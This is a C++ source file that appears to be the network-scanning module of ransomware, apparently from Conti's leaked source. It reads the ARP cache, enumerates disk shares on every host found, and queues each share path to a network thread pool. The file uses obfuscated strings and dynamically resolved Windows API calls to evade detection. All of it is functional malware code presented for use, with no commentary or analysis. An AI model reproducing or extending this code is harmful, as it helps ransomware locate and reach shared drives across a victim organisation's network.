#include "network_scanner.h"
#include "../common.h"
#include "../api/getapi.h"
#include "../obfuscation/MetaString.h"
#include "../logs/logs.h"
#include "../threadpool/threadpool.h"

// ORIGINAL

STATIC
VOID ScanArpCache(network_scanner::PSHARE_LIST ShareList)
{
	PMIB_IPNETTABLE pIpNetTable = NULL;
	ULONG ulSize = 0;

	DWORD dwResult = pGetIpNetTable(NULL, &ulSize, FALSE);
	if (dwResult != ERROR_INSUFFICIENT_BUFFER) {
		return;
	}

	pIpNetTable = (PMIB_IPNETTABLE)m_malloc(ulSize);
	if (!pIpNetTable) {
		return;
	}

	dwResult = pGetIpNetTable(pIpNetTable, &ulSize, FALSE);
	if (dwResult != NO_ERROR) {
		free(pIpNetTable);
		return;
	}

	for (DWORD i = 0; i < pIpNetTable->dwNumEntries; i++) {

		MIB_IPNETROW row = pIpNetTable->table[i];

		if (row.dwType == MIB_IPNET_TYPE_INVALID ||
			row.dwType == MIB_IPNET_TYPE_OTHER) {
			continue;
		}

		IN_ADDR ipAddr;
		ipAddr.S_un.S_addr = row.dwAddr;
		char* szIp = pinet_ntoa(ipAddr);

		if (!szIp) {
			continue;
		}

		// Skip loopback and broadcast
		if (strcmp(szIp, "127.0.0.1") == 0 ||
			strcmp(szIp, "255.255.255.255") == 0) {
			continue;
		}

		// Convert to wide string
		WCHAR wszIp[64];
		RtlSecureZeroMemory(wszIp, sizeof(wszIp));
		pMultiByteToWideChar(CP_ACP, 0, szIp, -1, wszIp, 64);

		// Enumerate shares on this host
		network_scanner::EnumShares(wszIp, ShareList);

	}

	free(pIpNetTable);
}

VOID network_scanner::EnumShares(PWCHAR pwszIpAddress, PSHARE_LIST ShareList)
{
	PSHARE_INFO_1 pBuf = NULL;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	NET_API_STATUS nStatus;

	nStatus = pNetShareEnum(
		pwszIpAddress,
		1,
		(LPBYTE*)&pBuf,
		MAX_PREFERRED_LENGTH,
		&dwEntriesRead,
		&dwTotalEntries,
		NULL
	);

	if (nStatus != NERR_Success || !pBuf) {
		return;
	}

	for (DWORD i = 0; i < dwEntriesRead; i++) {

		// Skip admin/IPC/print shares
		if (pBuf[i].shi1_type != STYPE_DISKTREE) {
			continue;
		}

		if (!pBuf[i].shi1_netname) {
			continue;
		}

		// Build UNC path: \\ip\share
		PSHARE_INFO pShareInfo = (PSHARE_INFO)m_malloc(sizeof(SHARE_INFO));
		if (!pShareInfo) {
			continue;
		}

		RtlSecureZeroMemory(pShareInfo->wszSharePath, sizeof(pShareInfo->wszSharePath));
		wsprintfW(pShareInfo->wszSharePath, L"\\\\%s\\%s", pwszIpAddress, pBuf[i].shi1_netname);

		TAILQ_INSERT_TAIL(ShareList, pShareInfo, Entries);

		logs::Write(OBFW(L"Found share: %s"), pShareInfo->wszSharePath);

	}

	if (pBuf) {
		pNetApiBufferFree(pBuf);
	}
}

VOID network_scanner::StartScan()
{
	logs::Write(OBFW(L"Starting network scan..."));

	SHARE_LIST ShareList;
	TAILQ_INIT(&ShareList);

	ScanArpCache(&ShareList);

	// Submit found shares to the network threadpool
	PSHARE_INFO pShare = NULL;
	TAILQ_FOREACH(pShare, &ShareList, Entries) {

		std::wstring SharePath = pShare->wszSharePath;
		threadpool::PutTask(threadpool::NETWORK_THREADPOOL, SharePath);

	}

	// Cleanup share list
	while (!TAILQ_EMPTY(&ShareList)) {
		pShare = TAILQ_FIRST(&ShareList);
		TAILQ_REMOVE(&ShareList, pShare, Entries);
		free(pShare);
	}

	logs::Write(OBFW(L"Network scan complete."));
}
